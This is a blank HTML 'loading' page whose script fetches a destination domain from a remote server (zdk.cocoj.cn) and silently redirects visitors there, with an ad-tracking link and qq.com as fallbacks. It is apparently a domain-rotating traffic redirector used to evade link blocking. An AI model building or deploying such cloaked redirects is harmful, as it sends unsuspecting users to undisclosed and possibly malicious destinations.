<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title>加载中</title>
		<script>
			function get(url, fn) {
			    var xhr = new XMLHttpRequest();
			    xhr.open('GET', url, false);
			    xhr.onreadystatechange = function () {
			        if (xhr.readyState == 4 && (xhr.status == 200 || xhr.status == 304)) {
			            fn.call(this, xhr.responseText);
			        } else {
			            window.location.href = 'https://cpu.baidu.com/1032/c99ebceb?scid=72815'
			        }
			    };
			    xhr.send();
			}
			get('https://zdk.cocoj.cn/article/skip',function(resData){
					var res = JSON.parse(resData);
					if(res.body.domain){
							var arr = window.location.href.split('?');
							arr.splice(0, 1);
							var str = arr.splice(0, 1);
							var locationYrl ='http://'+res.body.domain+'/'+str.join('');
							if (arr.length > 0) {
								locationYrl = locationYrl + '?' + arr.join('');
							}
							window.location.href = locationYrl;
					}else{
							window.location.href = 'https://www.qq.com'
					}
			})
	
		</script>
	</head>
	<body>
	</body>
</html>
